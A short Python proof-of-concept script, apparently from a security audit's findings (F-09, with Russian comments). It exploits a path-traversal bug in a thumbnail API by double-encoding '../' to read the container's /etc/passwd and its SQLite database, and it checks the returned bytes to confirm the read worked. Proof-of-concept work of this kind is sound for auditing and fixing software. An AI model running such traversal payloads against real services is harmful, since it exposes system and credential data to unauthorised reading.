# -*- coding: utf-8 -*-
"""F-09. thumbnail проверяет '..' до PathUnescape.
Двойное кодирование %252e%252e%252f выходит из каталога аватаров.
Не-картинка отдаётся целиком.
"""
from _http import Client, parser


def encoded(relative: str) -> str:
    return ("../" * 4 + relative).replace(".", "%252e").replace("/", "%252f")


def main():
    p = parser("Чтение файла контейнера через /api/avatars/thumbnail")
    p.add_argument("--path", default="", help="один путь от корня контейнера; пусто — /etc/passwd и база")
    args = p.parse_args()
    client = Client(args.base)
    targets = [args.path] if args.path else ["etc/passwd", "data/gorm.db"]
    for relative in targets:
        status, _, raw = client.call("GET", "/api/avatars/thumbnail?file=" + encoded(relative))
        if status != 200 or not raw:
            raise SystemExit(f"чтение {relative} не удалось: {status} {raw[:120]!r}")
        if relative == "etc/passwd" and not raw.startswith(b"root:"):
            raise SystemExit("ответ не похож на /etc/passwd")
        if relative == "data/gorm.db" and not raw.startswith(b"SQLite format 3"):
            raise SystemExit("ответ не похож на базу SQLite")
        print(f"OK {relative} bytes={len(raw)}")
        if raw.startswith(b"SQLite format 3"):
            print("SQLite format 3")
        else:
            print(raw[:180].decode("utf-8", "replace"))


if __name__ == "__main__":
    main()
